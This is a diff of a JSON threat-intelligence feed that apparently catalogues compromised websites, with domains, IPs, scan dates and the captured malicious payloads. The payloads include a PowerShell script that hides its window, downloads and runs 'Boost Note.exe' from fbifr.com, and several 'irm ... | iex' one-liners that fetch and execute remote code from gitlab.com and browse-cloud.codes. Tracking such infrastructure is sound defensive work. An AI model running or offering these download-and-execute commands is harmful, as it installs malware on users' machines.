@@ -1,5 +1,44 @@
 [
   {
+    "UrlDomain": "wistech.biz",
+    "DeliveryUrl": [
+      "fbifr.com"
+    ],
+    "PayloadUrl": [
+      "https://fbifr.com/eoN"
+    ],
+    "IP": [
+      "172.67.212.111"
+    ],
+    "Related": [],
+    "Payload": "$url = \"https://fbifr[.]com/eoN\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
+    "ResolvedDownloadUrl": [
+      "https://fbifr.com/eoN"
+    ],
+    "ReportId": "cmwmcvfn81snn0oml5h11ww14",
+    "ScannedAt": "2026-11-18T16:48:42.514000+00:00"
+  },
+  {
+    "UrlDomain": "wstarymstylu.pl",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "94.152.13.78"
+    ],
+    "Related": [
+      {
+        "Value": "gitlab.com",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "IRM gitlab[.]com/dsy648ajd6ff/7f1bafa-a7c5-477b-a7e3-4f9dbab46292/-/raw/main/58C-4dC67f645812 | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/dsy648ajd6ff/7f1bafa-a7c5-477b-a7e3-4f9dbab46292/-/raw/main/58C-4dC67f645812"
+    ],
+    "ReportId": "cmwmcr24e1slr0omlt0ye13yq",
+    "ScannedAt": "2026-11-18T16:45:18.406000+00:00"
+  },
+  {
     "UrlDomain": "www.sparkinnovationmarketing.com",
     "DeliveryUrl": [
       "browse-cloud.codes",
@@ -7299,58 +7338,5 @@
     ],
     "ReportId": "cmwi3te6h0xgl0omlrat1pbrc",
     "ScannedAt": "2026-11-15T17:24:06.080000+00:00"
-  },
-  {
-    "UrlDomain": "www.erikarenealarsen.com",
-    "DeliveryUrl": [
-      "browse-cloud.codes"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "162.241.217.93"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-cloud.codes/058ff855ad8e7e30",
-        "Type": "payload download"
-      },
-      {
-        "Value": "https://browse-cloud.codes/api.php?s=7f6210a091c37ae9bfa1bfd2562d440d842370e171427c6b&amp;_v=29912691",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "irm 'browse-cloud.codes/058ff855ad8e7e30'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-cloud.codes/058ff855ad8e7e30"
-    ],
-    "ReportId": "cmwi2o0iz0wl70omljttx6np4",
-    "ScannedAt": "2026-11-15T16:51:55.497000+00:00"
-  },
-  {
-    "UrlDomain": "diamondqualitycontractors.com",
-    "DeliveryUrl": [
-      "framesavecloudjs.beer",
-      "browse-cloud.codes"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "160.153.0.228"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-cloud.codes/6a72ba2774c19eaf",
-        "Type": "payload download"
-      },
-      {
-        "Value": "https://browse-cloud.codes/api.php?s=8402fb1338daab6a166e91aa8c92a20798acfa98fb75c5a2",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "irm 'browse-cloud.codes/6a72ba2774c19eaf'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-cloud.codes/6a72ba2774c19eaf"
-    ],
-    "ReportId": "cmwi2ffgu0wgc0omlvztx57aj",
-    "ScannedAt": "2026-11-15T16:45:14.945000+00:00"
   }
 ]
